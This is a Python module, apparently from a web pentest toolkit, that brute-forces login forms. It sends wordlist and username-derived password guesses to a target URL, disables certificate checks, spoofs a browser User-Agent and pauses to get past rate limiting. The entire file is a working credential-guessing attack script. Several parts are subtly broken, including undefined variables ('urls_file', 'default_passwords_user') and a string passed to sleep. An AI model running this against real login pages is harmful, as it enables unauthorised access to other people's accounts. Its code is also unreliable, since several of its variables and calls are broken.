import requests
import argparse
import sys, os, re
import time

from config.color_config import INFO, found, not_found, action_not_found, action_found

UserAgent = {'User-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko'}

def bf_top_password(url, wordlist, username_input, password_input, fc, nomessage=False, cookie_=False, user_known=False, onlypass=False, username=False):

    if not onlypass:
        print(" {} Bruteforce username:password".format(INFO))
        usernames = []
        if user_known:
            usernames = [user_known]
            default_passwords_user = ["{}".format(user_known), "{}@".format(user_known),
        "{}2016".format(user_known),"{}2017".format(user_known),"{}2018".format(user_known),"{}2019".format(user_known),"{}2020".format(user_known), "{}2021".format(user_known), 
        "{}2022".format(user_known), "{}2023".format(user_known),
        "{}2016*".format(user_known),"{}2017*".format(user_known),"{}2018*".format(user_known),"{}2019*".format(user_known),"{}2020*".format(user_known),"{}2021*".format(user_known),
        "{}2022*".format(user_known), "{}2023*".format(user_known),
        "{}@2016".format(user_known),"{}@2017".format(user_known),"{}@2018".format(user_known),"{}@2019".format(user_known),"{}@2020".format(user_known),"{}@2021".format(user_known),
        "{}@2022".format(user_known), "{}@2023".format(user_known),
        "{}2016!".format(user_known),"{}2017!".format(user_known),"{}2018!".format(user_known),"{}2019!".format(user_known),"{}2020!".format(user_known),"{}2021!".format(user_known),
        "{}2022!".format(user_known), "{}2023!".format(user_known),
        "{}123".format(user_known), "{}123!".format(user_known), "{}@123!".format(user_known), "{}@123*".format(user_known)]
        elif username:
            usernames.append(username)
        else:
            with open("credz/wordlists/top_default_username.txt", "r") as users:
                usernames += users
        for user in usernames:
            user = user.replace("\n","")
            with open(wordlist, "r+") as top_pass:
                for tp in top_pass.read().splitlines():
                    login = {username_input: user, password_input: tp}
                    try:
                        req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10, headers=UserAgent, cookies=cookie_)
                    except:
                        print(" i Error with {} credentials".format(login))
                        pass
                    if type(fc) != int:
                        if len(req.text) != fc[0] and len(req.text) != fc[1] and req.status_code not in [401, 403]:
                            print("  {}Potentially account or username found: {} [{}b]".format(found, login, len(req.content)))
                    elif nomessage and nomessage not in req.text:
                        print("  {}Potentially account or username found: {} [{}b]".format(found, login, len(req.content)))
                    else:
                        if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
                            print("  {}Potentially account or username found: {} [{}b] → [{}b]".format(found, login, fc, len(req.content)))
                        elif len(req.text) not in range(fc - 200, fc + 200) and req.status_code not in [401, 403]:
                            print("  {}Account found: {}".format(found, login))
                            #continue_scan = input(" {} An account was found do you want continue to check another account ? (y:n):".format(INFO))
                            if not urls_file:
                                sys.exit()
                            return True
                    sys.stdout.write("\033[34m{}: {} | {}: {}\033[0m\r".format(username_input, user, password_input, tp))
                    sys.stdout.write("\033[K")
            for dpu in default_passwords_user:
                    login = {username_input: user, password_input: dpu}
                    try:
                        req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10, headers=UserAgent, cookies=cookie_)
                    except:
                        print(" i Error with {} credentials".format(login))
                        pass
                    if type(fc) != int:
                        if len(req.text) != fc[0] and len(req.text) != fc[1] and req.status_code not in [401, 403]:
                            print("  {}Potentially account or username found: {} [{}b]".format(found, login, len(req.content)))
                    elif nomessage and nomessage not in req.text:
                        print("  {}Potentially account or username found: {} [{}b]".format(found, login, len(req.content)))
                    else:
                        if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403]:
                            print("  {}Potentially account or username found: {} [{}b] → [{}b]".format(found, login, fc, len(req.content)))
                        elif len(req.text) not in range(fc - 200, fc + 200) and req.status_code not in [401, 403]:
                            print("  {}Account found: {}".format(found, login))
                            #continue_scan = input(" {} An account was found do you want continue to check another account ? (y:n):".format(INFO))
                            if not urls_file:
                                sys.exit()
                            return True
                    sys.stdout.write("\033[34m{}: {} | {}: {}\033[0m\r".format(username_input, user, password_input, tp))
                    sys.stdout.write("\033[K")

    else:
        print(" {} Bruteforce password".format(INFO))
        with open(wordlist, "r+") as top_pass:
            for tp in top_pass.read().splitlines():
                login = {password_input: tp}
                req = requests.post(url, data=login, verify=False, allow_redirects=False, timeout=10, headers=UserAgent, cookies=cookie_)
                if len(req.text) not in range(fc - 100, fc + 100) and req.status_code not in [401, 403, 429]:
                    print("  {}Potentially password: {}".format(found, login))
                elif len(req.text) not in range(fc - 300, fc + 300) and req.status_code not in [401, 403, 429]:
                    print("  {}Password found: {}".format(found, login))
                    #continue_scan = input(" {} An account was found do you want continue to check another account ? (y:n):".format(INFO))
                    if not urls_file:
                        sys.exit()
                    return True
                elif "Too many" in req.text or req.status_code == 429:
                    from threading import Timer

                    timeout = 10
                    t = Timer(timeout, print, ['Sorry, times up'])
                    t.start()
                    prompt = "Too many failed attempts, please defined how much time you will wait (wait 10scd for default 60s): "
                    answer = input(prompt)
                    t.cancel()
                    if answer:
                        time.sleep(answer)
                    else:
                        time.sleep(60)
                sys.stdout.write("\033[34 password: {}\033[0m\r".format(tp))
                sys.stdout.write("\033[K")